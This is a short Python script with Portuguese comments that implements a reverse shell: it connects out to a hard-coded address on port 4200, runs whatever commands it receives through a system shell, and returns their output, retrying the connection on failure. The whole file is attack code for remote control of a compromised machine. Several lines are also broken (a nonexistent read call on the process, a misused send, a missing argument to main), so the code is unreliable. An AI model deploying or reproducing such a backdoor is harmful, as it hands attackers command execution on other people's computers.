#coding: utf-8
import socket
import subprocess

ip = "192.168.2.13" #modificar de acordo com a maquina 
porta = 4200 #modificar de acordo com a maquina
c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def erro(c):
    if c:
        c.close()
    main()

def conectar(ip,porta):
    try:
        c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        c.connect((ip,porta))
        c.send("Conectado")
        return c
    except:
        print("Erro ao Conectar")
        print("Reconectando")
        erro(c) 

def shell(c):
    while True:
        try:
            dados = c.recv(1024)
            proc = subprocess.Popen(dados,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            saida = proc.read()+proc.stderr.read()
            c.send(saida,"\n")
        except:
            print("Erro ao Conectar")
            print("Reconectando")
            erro(c)

def main(c):
    while True:
        c_connect=conectar(ip,porta)
        if (c_connect):
            shell(c_connect)
        else:
            print("Erro ao Conectar")
            print("Reconectando")
            erro(c) 
main(c)